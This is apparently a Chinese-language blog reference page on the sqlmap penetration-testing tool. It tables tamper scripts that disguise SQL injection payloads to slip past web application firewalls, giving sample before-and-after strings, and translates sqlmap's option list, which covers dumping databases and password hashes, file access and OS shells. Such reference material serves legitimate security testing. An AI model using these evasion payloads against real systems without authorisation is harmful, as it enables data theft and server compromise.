---
title: "sqlmap"
date: 2024-05-14
categories: ["网安", "黑客工具"]
description: "根据实际情况，可以同时使用多个脚本，使用-v参数可以看到payload的变化。"
tags: []
---

# 脚本
## 使用方法

根据实际情况，可以同时使用多个脚本，使用-v参数可以看到payload的变化。
```
--tamper "apostrophemask.py,base64encode.py,multiplespaces.py,space2plus.py" 
```
## 脚本列表

<table>
<tr>
<td>支持的数据库</td>
<td>编号</td>
<td>脚本名称</td>
<td>作用</td>
<td>实现方式</td>
</tr>
<tr>
<td rowspan="16" colspan="1">all</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">apostrophemask.py</td>
<td rowspan="2" colspan="1">用utf8代替引号</td>
<td>(“1 AND ‘1’=’1”) </td>
</tr>
<tr>
<td>‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’ </td>
</tr>
<tr>
<td rowspan="2" colspan="1">2</td>
<td rowspan="2" colspan="1">base64encode.py </td>
<td rowspan="2" colspan="1">用base64编码替换</td>
<td>(“1′ AND SLEEP(5)#”)</td>
</tr>
<tr>
<td>‘MScgQU5EIFNMRUVQKDUpIw==’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">3</td>
<td rowspan="2" colspan="1">multiplespaces.py</td>
<td rowspan="2" colspan="1">围绕SQL关键字添加多个空格</td>
<td>(‘1 UNION SELECT foobar’)</td>
</tr>
<tr>
<td>‘1    UNION     SELECT   foobar’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">4</td>
<td rowspan="2" colspan="1">space2plus.py</td>
<td rowspan="2" colspan="1">用+替换空格</td>
<td>(‘SELECT id FROM users’)</td>
</tr>
<tr>
<td>‘SELECT+id+FROM+users’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">5</td>
<td rowspan="2" colspan="1">nonrecursivereplacement.py</td>
<td>双重查询语句。取代predefined SQL关键字with表示 </td>
<td>(‘1 UNION SELECT 2–‘)</td>
</tr>
<tr>
<td>suitable for替代（例如  .replace（“SELECT”、””)） filters</td>
<td>‘1 UNIOUNIONN SELESELECTCT 2–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">6</td>
<td rowspan="2" colspan="1">space2randomblank.py</td>
<td>代替空格字符（“”）从一个随机的空</td>
<td>(‘SELECT id FROM users’)</td>
</tr>
<tr>
<td>白字符可选字符的有效集</td>
<td>‘SELECT%0Did%0DFROM%0Ausers’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">7</td>
<td rowspan="2" colspan="1">unionalltounion.py</td>
<td rowspan="2" colspan="1">替换UNION ALL SELECT UNION SELECT</td>
<td>(‘-1 UNION ALL SELECT’)</td>
</tr>
<tr>
<td>‘-1 UNION SELECT’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">8</td>
<td rowspan="2" colspan="1">securesphere.py</td>
<td rowspan="2" colspan="1">追加特制的字符串</td>
<td>(‘1 AND 1=1’)</td>
</tr>
<tr>
<td>“1 AND 1=1 and ‘0having’=’0having'”</td>
</tr>
<tr>
<td rowspan="24" colspan="1">mssql</td>
<td rowspan="3" colspan="1">1</td>
<td rowspan="3" colspan="1">space2hash.py</td>
<td rowspan="3" colspan="1">绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td>
<td></td>
</tr>
<tr>
<td>‘1 AND 9227=9227’ </td>
</tr>
<tr>
<td>‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’ </td>
</tr>
<tr>
<td rowspan="3" colspan="1">2</td>
<td rowspan="3" colspan="1">equaltolike.py</td>
<td rowspan="3" colspan="1">like 代替等号</td>
<td></td>
</tr>
<tr>
<td>* Input: SELECT * FROM users WHERE id=1 </td>
</tr>
<tr>
<td>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td>
</tr>
<tr>
<td rowspan="2" colspan="1">3</td>
<td rowspan="2" colspan="1">space2mssqlblank.py(mssql)</td>
<td rowspan="2" colspan="1">空格替换为其它空符号</td>
<td>Input: SELECT id FROM users</td>
</tr>
<tr>
<td>Output: SELECT%08id%02FROM%0Fusers</td>
</tr>
<tr>
<td rowspan="2" colspan="1">4</td>
<td rowspan="2" colspan="1">space2mssqlhash.py</td>
<td rowspan="2" colspan="1">替换空格</td>
<td>(‘1 AND 9227=9227’)</td>
</tr>
<tr>
<td>‘1%23%0AAND%23%0A9227=9227’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">5</td>
<td rowspan="2" colspan="1">between.py</td>
<td rowspan="2" colspan="1">用between替换大于号（>）</td>
<td>(‘1 AND A > B–‘)</td>
</tr>
<tr>
<td>‘1 AND A NOT BETWEEN 0 AND B–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">6</td>
<td rowspan="2" colspan="1">percentage.py</td>
<td rowspan="2" colspan="1">asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE</td>
</tr>
<tr>
<td>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td rowspan="2" colspan="1">7</td>
<td rowspan="2" colspan="1">sp_password.py</td>
<td rowspan="2" colspan="1">追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
<td>(‘1 AND 9227=9227– ‘)</td>
</tr>
<tr>
<td>‘1 AND 9227=9227– sp_password’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">8</td>
<td rowspan="2" colspan="1">charencode.py</td>
<td rowspan="2" colspan="1">url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE</td>
</tr>
<tr>
<td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td rowspan="2" colspan="1">9</td>
<td rowspan="2" colspan="1">randomcase.py</td>
<td rowspan="2" colspan="1">随机大小写</td>
<td>* Input: INSERT</td>
</tr>
<tr>
<td>* Output: InsERt</td>
</tr>
<tr>
<td rowspan="2" colspan="1">10</td>
<td rowspan="2" colspan="1">charunicodeencode.py</td>
<td rowspan="2" colspan="1">字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE</td>
</tr>
<tr>
<td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td rowspan="2" colspan="1">11</td>
<td rowspan="2" colspan="1">space2comment.py</td>
<td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users</td>
</tr>
<tr>
<td>* Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td rowspan="38" colspan="1">mysql >= 5.1.13</td>
<td rowspan="3" colspan="1">1</td>
<td rowspan="3" colspan="1">equaltolike.py</td>
<td rowspan="3" colspan="1">like 代替等号</td>
<td></td>
</tr>
<tr>
<td>* Input: SELECT * FROM users WHERE id=1 </td>
</tr>
<tr>
<td>2 * Output: SELECT * FROM users WHERE id LIKE 1 </td>
</tr>
<tr>
<td rowspan="2" colspan="1">2</td>
<td rowspan="2" colspan="1">greatest.py</td>
<td rowspan="2" colspan="1">绕过过滤’>’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A > B’)</td>
</tr>
<tr>
<td>‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td rowspan="3" colspan="1">3</td>
<td rowspan="3" colspan="1">apostrophenullencode.py</td>
<td rowspan="3" colspan="1">绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)</td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">4</td>
<td rowspan="2" colspan="1">ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。</td>
<td>(‘IFNULL(1, 2)’)</td>
</tr>
<tr>
<td>替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
<td>‘IF(ISNULL(1),2,1)’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">5</td>
<td rowspan="2" colspan="1">space2mssqlhash.py</td>
<td rowspan="2" colspan="1">替换空格</td>
<td>(‘1 AND 9227=9227’)</td>
</tr>
<tr>
<td>‘1%23%0AAND%23%0A9227=9227’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">6</td>
<td rowspan="2" colspan="1">modsecurityversioned.py</td>
<td rowspan="2" colspan="1">过滤空格，包含完整的查询版本注释</td>
<td>(‘1 AND 2>1–‘)</td>
</tr>
<tr>
<td>‘1 /*!30874AND 2>1*/–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">7</td>
<td rowspan="2" colspan="1">space2mysqlblank.py</td>
<td rowspan="2" colspan="1">空格替换其它空白符号(mysql)</td>
<td>Input: SELECT id FROM users</td>
</tr>
<tr>
<td>Output: SELECT%0Bid%0BFROM%A0users</td>
</tr>
<tr>
<td rowspan="2" colspan="1">8</td>
<td rowspan="2" colspan="1">between.py</td>
<td rowspan="2" colspan="1">用between替换大于号（>）</td>
<td>(‘1 AND A > B–‘)</td>
</tr>
<tr>
<td>‘1 AND A NOT BETWEEN 0 AND B–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">9</td>
<td rowspan="2" colspan="1">modsecurityzeroversioned.py</td>
<td rowspan="2" colspan="1">包含了完整的查询与零版本注释</td>
<td>(‘1 AND 2>1–‘)</td>
</tr>
<tr>
<td>‘1 /*!00000AND 2>1*/–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">10</td>
<td rowspan="2" colspan="1">space2mysqldash.py</td>
<td rowspan="2" colspan="1">替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td>
<td>(‘1 AND 9227=9227’)</td>
</tr>
<tr>
<td>‘1–%0AAND–%0A9227=9227’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">11</td>
<td rowspan="2" colspan="1">bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。</td>
<td>(‘SELECT id FROM users where id = 1’)</td>
</tr>
<tr>
<td>然后替换=为like</td>
<td>‘SELECT%09id FROM users where id LIKE 1’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">12</td>
<td rowspan="2" colspan="1">percentage.py</td>
<td rowspan="2" colspan="1">asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE</td>
</tr>
<tr>
<td>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td rowspan="2" colspan="1">13</td>
<td rowspan="2" colspan="1">charencode.py</td>
<td rowspan="2" colspan="1">url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE</td>
</tr>
<tr>
<td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td rowspan="2" colspan="1">14</td>
<td rowspan="2" colspan="1">randomcase.py</td>
<td rowspan="2" colspan="1">随机大小写</td>
<td>* Input: INSERT</td>
</tr>
<tr>
<td>* Output: InsERt</td>
</tr>
<tr>
<td rowspan="2" colspan="1">15</td>
<td rowspan="2" colspan="1">versionedkeywords.py</td>
<td rowspan="2" colspan="1">Encloses each non-function keyword with versioned MySQL comment</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</td>
</tr>
<tr>
<td>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS**!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</td>
</tr>
<tr>
<td rowspan="2" colspan="1">16</td>
<td rowspan="2" colspan="1">space2comment.py</td>
<td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users</td>
</tr>
<tr>
<td>* Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td rowspan="2" colspan="1">17</td>
<td rowspan="2" colspan="1">charunicodeencode.py</td>
<td rowspan="2" colspan="1">字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE</td>
</tr>
<tr>
<td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td rowspan="2" colspan="1">18</td>
<td rowspan="2" colspan="1">versionedmorekeywords.py</td>
<td rowspan="2" colspan="1">注释绕过</td>
<td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</td>
</tr>
<tr>
<td>* Output: 1/*!UNION**!ALL**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#</td>
</tr>
<tr>
<td rowspan="4" colspan="1">MySQL < 5.1</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">halfversionedmorekeywords.py</td>
<td rowspan="2" colspan="1">关键字前加注释</td>
<td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa</td>
</tr>
<tr>
<td>* Output: value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND ‘QDWa’=’QDWa</td>
</tr>
<tr>
<td rowspan="2" colspan="1">2</td>
<td rowspan="2" colspan="1">halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加</td>
<td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)</td>
</tr>
<tr>
<td>mysql版本评论</td>
<td>2.”value’/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND ‘QDWa’=’QDWa”</td>
</tr>
<tr>
<td rowspan="2" colspan="1">MySQL >= 5.1.13</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">space2morehash.py</td>
<td rowspan="2" colspan="1">空格替换为 #号 以及更多随机字符串 换行符</td>
<td>* Input: 1 AND 9227=9227</td>
</tr>
<tr>
<td>* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227</td>
</tr>
<tr>
<td rowspan="15" colspan="1"> Oracle</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">greatest.py</td>
<td rowspan="2" colspan="1">绕过过滤’>’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A > B’)</td>
</tr>
<tr>
<td>‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td rowspan="3" colspan="1">2</td>
<td rowspan="3" colspan="1">apostrophenullencode.py</td>
<td rowspan="3" colspan="1">绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)</td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">3</td>
<td rowspan="2" colspan="1">between.py</td>
<td rowspan="2" colspan="1">用between替换大于号（>）</td>
<td>(‘1 AND A > B–‘)</td>
</tr>
<tr>
<td>‘1 AND A NOT BETWEEN 0 AND B–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">4</td>
<td rowspan="2" colspan="1">charencode.py</td>
<td rowspan="2" colspan="1">url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE</td>
</tr>
<tr>
<td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td rowspan="2" colspan="1">5</td>
<td rowspan="2" colspan="1">randomcase.py</td>
<td rowspan="2" colspan="1">随机大小写</td>
<td>* Input: INSERT</td>
</tr>
<tr>
<td>* Output: InsERt</td>
</tr>
<tr>
<td rowspan="2" colspan="1">6</td>
<td rowspan="2" colspan="1">charunicodeencode.py</td>
<td rowspan="2" colspan="1">字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE</td>
</tr>
<tr>
<td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td rowspan="2" colspan="1">7</td>
<td rowspan="2" colspan="1">space2comment.py</td>
<td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users</td>
</tr>
<tr>
<td>* Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td rowspan="17" colspan="1"> PostgreSQL</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">greatest.py</td>
<td rowspan="2" colspan="1">绕过过滤’>’ ,用GREATEST替换大于号。</td>
<td>(‘1 AND A > B’)</td>
</tr>
<tr>
<td>‘1 AND GREATEST(A,B+1)=A’</td>
</tr>
<tr>
<td rowspan="3" colspan="1">2</td>
<td rowspan="3" colspan="1">apostrophenullencode.py</td>
<td rowspan="3" colspan="1">绕过过滤双引号，替换字符和双引号。</td>
<td>tamper(“1 AND ‘1’=’1”)</td>
</tr>
<tr>
<td></td>
</tr>
<tr>
<td>‘1 AND %00%271%00%27=%00%271’</td>
</tr>
<tr>
<td rowspan="2" colspan="1">3</td>
<td rowspan="2" colspan="1">between.py</td>
<td rowspan="2" colspan="1">用between替换大于号（>）</td>
<td>(‘1 AND A > B–‘)</td>
</tr>
<tr>
<td>‘1 AND A NOT BETWEEN 0 AND B–‘</td>
</tr>
<tr>
<td rowspan="2" colspan="1">4</td>
<td rowspan="2" colspan="1">percentage.py</td>
<td rowspan="2" colspan="1">asp允许每个字符前面添加一个%号</td>
<td>* Input: SELECT FIELD FROM TABLE</td>
</tr>
<tr>
<td>* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
</tr>
<tr>
<td rowspan="2" colspan="1">5</td>
<td rowspan="2" colspan="1">charencode.py</td>
<td rowspan="2" colspan="1">url编码</td>
<td>* Input: SELECT FIELD FROM%20TABLE</td>
</tr>
<tr>
<td>* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td>
</tr>
<tr>
<td rowspan="2" colspan="1">6</td>
<td rowspan="2" colspan="1">randomcase.py</td>
<td rowspan="2" colspan="1">随机大小写</td>
<td>* Input: INSERT</td>
</tr>
<tr>
<td>* Output: InsERt</td>
</tr>
<tr>
<td rowspan="2" colspan="1">7</td>
<td rowspan="2" colspan="1">charunicodeencode.py</td>
<td rowspan="2" colspan="1">字符串 unicode 编码</td>
<td>* Input: SELECT FIELD%20FROM TABLE</td>
</tr>
<tr>
<td>* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td>
</tr>
<tr>
<td rowspan="2" colspan="1">8</td>
<td rowspan="2" colspan="1">space2comment.py</td>
<td rowspan="2" colspan="1">Replaces space character (‘ ‘) with comments ‘/**/’</td>
<td>* Input: SELECT id FROM users</td>
</tr>
<tr>
<td>* Output: SELECT//id//FROM/**/users</td>
</tr>
<tr>
<td rowspan="2" colspan="1">Access</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">appendnullbyte.py</td>
<td rowspan="2" colspan="1">在有效负荷结束位置加载零字节字符编码</td>
<td>(‘1 AND 1=1’)</td>
</tr>
<tr>
<td>‘1 AND 1=1%00’</td>
</tr>
<tr>
<td rowspan="5" colspan="1">其他</td>
<td rowspan="2" colspan="1">1</td>
<td rowspan="2" colspan="1">chardoubleencode.py</td>
<td rowspan="2" colspan="1">双url编码(不处理以编码的)</td>
<td>* Input: SELECT FIELD FROM%20TABLE</td>
</tr>
<tr>
<td>* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545</td>
</tr>
<tr>
<td rowspan="2" colspan="1">2</td>
<td rowspan="2" colspan="1">unmagicquotes.py</td>
<td rowspan="2" colspan="1">宽字符绕过 GPC  addslashes</td>
<td>* Input: 1′ AND 1=1</td>
</tr>
<tr>
<td>* Output: 1%bf%27 AND 1=1–%20</td>
</tr>
<tr>
<td>3</td>
<td>randomcomments.py</td>
<td>用/**/分割sql关键字</td>
<td>‘INSERT’ becomes ‘IN//S//ERT’</td>
</tr>
</table>

# 命令详解
```
Options:
  -h, --help            显示基本帮助消息并退出
  -hh                   展示先进的帮助信息并退出
  --version             显示程序的版本号并退出
  -v VERBOSE            冗长水平:0 - 6(默认 1)

  目标:
    必须至少提供其中一个选项来定义目标

    -u URL, --url=URL   目标URL(例如 "http://www.site.com/vuln.php?id=1")
    -d DIRECT           连接字符串直接数据库连接
    -l LOGFILE          解析目标(s)从打嗝或WebScarab代理日志文件
    -m BULKFILE         扫描多个目标在一个文本文件
    -r REQUESTFILE      从文件中加载HTTP请求
    -g GOOGLEDORK       将Google dork结果作为目标URL处理
    -c CONFIGFILE       从一个配置加载选项INI文件

  请求:
    这些选项可用于指定如何连接到目标URL

    -A AGENT, --user..  HTTP用户代理头的值
    -H HEADER, --hea..  额外的头(例如 "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     强制使用给定HTTP方法(例如 PUT)
    --data=DATA         通过POST发送的数据字符串(例如 "id=1")
    --param-del=PARA..  用于拆分参数值的字符(例如 &
    --cookie=COOKIE     HTTP Cookie头的值(例如 "PHPSESSID=a8d127e..")
    --cookie-del=COO..  用于拆分cookie值的字符(例如 ;)
    --live-cookies=L..  用于加载最新值的实时cookie文件
    --load-cookies=L..  包含Netscape/wget格式cookie的文件
    --drop-set-cookie   忽略响应中的Set Cookie标头
    --mobile            模仿智能手机通过HTTP代理头
    --random-agent      使用随机选择的HTTP用户代理标头值
    --host=HOST         HTTP主机头的值
    --referer=REFERER   HTTP引用页头的值
    --headers=HEADERS   额外的标题(例如"Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP身份验证类型(Basic, Digest, Bearer, ...)
    --auth-cred=AUTH..  HTTP身份验证凭证(名称:密码)
    --auth-file=AUTH..  HTTP身份验证PEM证书/私钥文件
    --ignore-code=IG..  忽略(问题)的HTTP错误代码(例如: 401)
    --ignore-proxy      忽略系统默认代理设置
    --ignore-redirects  忽略重定向的尝试
    --ignore-timeouts   忽略连接超时
    --proxy=PROXY       使用一个代理连接到目标URL
    --proxy-cred=PRO..  代理身份验证凭证(名称:密码)
    --proxy-file=PRO..  从文件加载代理列表
    --proxy-freq=PRO..  请求改变之间的代理从一个给定的列表
    --tor               使用Tor匿名网络
    --tor-port=TORPORT  设置Tor代理端口,而不是默认值
    --tor-type=TORTYPE  设置Tor代理类型(HTTP、SOCKS4或SOCKS5(默认)
    --check-tor         查看是否正确使用Tor
    --delay=DELAY       每个HTTP请求之间的延迟（秒）
    --timeout=TIMEOUT   超时连接前等待的秒数(默认值 30)
    --retries=RETRIES   重试时连接超时(默认 3)
    --retry-on=RETRYON  对匹配内容的正则表达式重试请求(例如 "drop")
    --randomize=RPARAM  对于给定的参数随机变化值(s)
    --safe-url=SAFEURL  URL地址访问期间经常测试
    --safe-post=SAFE..  POST数据发送到一个安全的URL
    --safe-req=SAFER..  从一个文件装载安全的HTTP请求
    --safe-freq=SAFE..  定期请求访问一个安全的URL
    --skip-urlencode    跳过URL编码的有效载荷数据
    --csrf-token=CSR..  参数用于保存anti-CSRF令牌
    --csrf-url=CSRFURL  URL地址为提取anti-CSRF访问令牌
    --csrf-method=CS..  HTTP方法使用anti-CSRF标记页面访问期间
    --csrf-data=CSRF..  POST数据发送anti-CSRF标记页面访问期间
    --csrf-retries=C..  重试anti-CSRF令牌检索(默认 0)
    --force-ssl         强制使用SSL/HTTPS
    --chunked           使用HTTP分块传输编码(POST)请求
    --hpp               使用HTTP参数污染的方法
    --eval=EVALCODE     请求之前评估提供Python代码(例如 "import
                        hashlib;id2=hashlib.md5(id).hexdigest()")

  优化:
    这些选项可用于优化sqlmap的性能

    -o                  打开所有优化开关
    --predict-output    预测常见的查询输出
    --keep-alive        使用持久HTTP (s)连接
    --null-connection   检索页面长度没有实际的HTTP响应的身体
    --threads=THREADS   最大并发HTTP (s)请求(默认 1)

  注射:
    这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本

    -p TESTPARAMETER    可测试参数
    --skip=SKIP         跳过测试对于给定参数(s)
    --skip-static       跳过测试参数不似乎是动态的
    --param-exclude=..  Regexp排除参数测试(例如 "ses")
    --param-filter=P..  选择测试的参数(s)的位置(例如 "POST")
    --dbms=DBMS         强制后端DBMS提供值
    --dbms-cred=DBMS..  DBMS身份验证凭据(用户:密码)
    --os=OS             强制后端DBMS操作系统提供价值
    --invalid-bignum    使用大量无效值
    --invalid-logical   使用逻辑操作无效值
    --invalid-string    使用随机字符串无效值
    --no-cast           关掉负载铸造机制
    --no-escape         关掉字符串转义机制
    --prefix=PREFIX     注入载荷前缀字符串
    --suffix=SUFFIX     注入载荷后缀字符串
    --tamper=TAMPER     使用给定的脚本(s)篡改注入数据

  侦查:
    这些选项可用于自定义检测阶段

    --level=LEVEL       要执行的测试的水平(1-5,默认 1)
    --risk=RISK         要执行的测试的风险(1-3,默认 1)
    --string=STRING     查询字符串来匹配时求值为True
    --not-string=NOT..  字符串匹配时查询计算为False
    --regexp=REGEXP     Regexp匹配查询时求值为True
    --code=CODE         HTTP代码查询评估为True时匹配
    --smart             进行彻底的测试只有在积极的启发式(s)
    --text-only         页面只基于文本内容进行比较
    --titles            比较页面仅基于他们的头衔

  技术:
    这些选项可用于调整特定SQL注入技术的测试

    --technique=TECH..  要使用的SQL注入技术(默认 "BEUSTQ")
    --time-sec=TIMESEC  秒延迟DBMS响应(默认 5)
    --union-cols=UCOLS  列的SQL注入的测试联合查询
    --union-char=UCHAR  字符用于bruteforcing列数
    --union-from=UFROM  UNION查询SQL注入的FROM部分中使用的表
    --dns-domain=DNS..  域名用于DNS漏出攻击
    --second-url=SEC..  产生的页面的URL搜索二阶响应
    --second-req=SEC..  从文件加载二阶HTTP请求

  Fingerprint:
    -f, --fingerprint   执行一个广泛的DBMS版本指纹

  枚举:
    这些选项可用于枚举表中包含的后端数据库管理系统信息、结构和数据

    -a, --all           检索所有
    -b, --banner        检索DBMS横幅
    --current-user      获取当前用户数据库管理系统
    --current-db        检索DBMS当前数据库
    --hostname          检索DBMS服务器主机名
    --is-dba            检测是否DBA DBMS当前用户
    --users             列举DBMS用户
    --passwords         列举DBMS用户 password hashes
    --privileges        列举DBMS用户 privileges
    --roles             列举DBMS用户 roles
    --dbs               列举DBMS数据库
    --tables            列举DBMS数据库表
    --columns           列举DBMS数据库表列
    --schema            枚举 DBMS 模式
    --count             检索表(s)的条目数量
    --dump              转储DBMS数据库表条目
    --dump-all          转储所有DBMS数据库表条目
    --search            搜索列、表和/或数据库名称
    --comments          枚举期间检查DBMS注释
    --statements        检索SQL语句被运行在DBMS
    -D DB               数据库管理系统数据库来列举
    -T TBL              数据库管理系统数据库表(s)列举
    -C COL              数据库管理系统数据库表列(s)枚举
    -X EXCLUDE          数据库管理系统数据库标识符(s)不列举
    -U USER             DBMS用户列举
    --exclude-sysdbs    列举表时排除DBMS系统数据库
    --pivot-column=P..  主列名称
    --where=DUMPWHERE   使用条件而表倾销
    --start=LIMITSTART  第一个转储表条目检索
    --stop=LIMITSTOP    去年转储表条目检索
    --first=FIRSTCHAR   第一个查询输出单词字符检索
    --last=LASTCHAR     最后输出单词字符检索查询
    --sql-query=SQLQ..  要执行的SQL语句
    --sql-shell         提示一个交互式SQL壳
    --sql-file=SQLFILE  从给定的文件执行的SQL语句(s)

  蛮力破解:
    这些选项可用于运行暴力检查

    --common-tables     检查存在的常见的表
    --common-columns    检查是否存在共同的列
    --common-files      检查公共文件的存在

  用户定义函数注入:
    这些选项可用于创建自定义用户定义函数

    --udf-inject        注入自定义用户定义函数
    --shared-lib=SHLIB  共享库的本地路径

  文件系统访问:
    这些选项可用于访问后端数据库管理系统底层文件系统

    --file-read=FILE..  读取一个文件从文件系统后端数据库管理系统
    --file-write=FIL..  写一个本地文件的后端数据库管理系统的文件系统
    --file-dest=FILE..  后端DBMS绝对filepath写

  操作系统访问:
    这些选项可用于访问后端数据库管理系统底层操作系统

    --os-cmd=OSCMD      执行一个操作系统命令
    --os-shell          提示一个交互式操作系统shell
    --os-pwn            OOB shell提示,Meterpreter或VNC
    --os-smbrelay       一个点击提示OOB壳,Meterpreter或VNC
